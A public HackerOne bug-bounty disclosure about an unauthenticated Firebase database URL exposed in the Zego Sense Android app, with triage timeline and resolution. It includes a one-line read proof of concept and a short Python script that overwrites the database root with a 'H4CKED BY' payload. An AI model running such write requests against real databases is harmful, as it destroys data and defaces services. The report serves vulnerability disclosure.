---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-authentication-generic
  - env/mobile
  - stack/firebase
  - os/android
substate: "resolved"
weakness: "Improper Authentication - Generic"
enriched: true
body: true
date: 2021-06-23
submitted: 2020-12-23T13:45:53.246Z
bounty_usd: null
votes: 58
cve: []
program: "[[programs/zego|Zego]]"
reporter: "sheikhrishad0"
source: "https://hackerone.com/reports/1065134"
title: "Firebase Database Takeover in Zego Sense Android app"
---
# Firebase Database Takeover in Zego Sense Android app

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 58 | **Program:** Zego | **Disclosed:** 2021-06-23

- Report: [https://hackerone.com/reports/1065134](https://hackerone.com/reports/1065134)
- CWE: Improper Authentication - Generic
- Submitted: 2020-12-23T13:45:53.246Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hello Team,

Summary:
publicly available Firebase Database (api-project-615509201590.firebaseio.com)

Platform Affected: [android]
com.zegocover.zego

Steps To Reproduce:

in res/values/strings.xml

    <string name="firebase_database_url">https://api-project-615509201590.firebaseio.com</string>

POC:

    Go to https://api-project-615509201590.firebaseio.com/.json

{F1127099}

Exploit:

    import requests
    data= {"Exploit":"Successfull", "H4CKED BY": "Sheikh Rishad"}
    reponse = requests.put("https://api-project-615509201590.firebaseio.com/.json", json=data)


References:


There are guidelines available by Firebase to resolve the insecurities and misconfiguration, please follow this link:
https://firebase.google.com/docs/database/security/resolve-insecurities

Regards,
Sheikh Rishad

## Impact

This is quite serious because by using this database attacker can use this for malicious purposes and also an attacker can track this database if zego uses it for future perspective and at that time it will be much easier for the attacker to steal the data from this repository and later it will harm the reputation of the zego.

So please immediately change the rule of the database to private so that nobody can able to access it outside.

## Timeline

- **Report Filed**
- **2020-12-24** @staple: Hi @sheikhrishad,

Thank you for your submission. I hope you are well in these tough times of the pandemic. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@staple
- **2020-12-24** @sheikhrishad0: any update?
- **2020-12-26** @sheikhrishad0: any update on this issue?
- **Report Severity Updated**
- **Report Severity Updated**
- **Report Triaged**
- **External User Joined**
- **2021-02-06** @sheikhrishad0: the issue has been fixed!
- **Report Resolved**
- **Agreed On Going Public**
- **Cancelled Disclosure Request**
- **Agreed On Going Public**
- **Report Title Updated**
- **2021-05-24** @silvian: Done
- **2021-05-24** @sheikhrishad0: **limited disclose**? :)
- **Report Became Public**
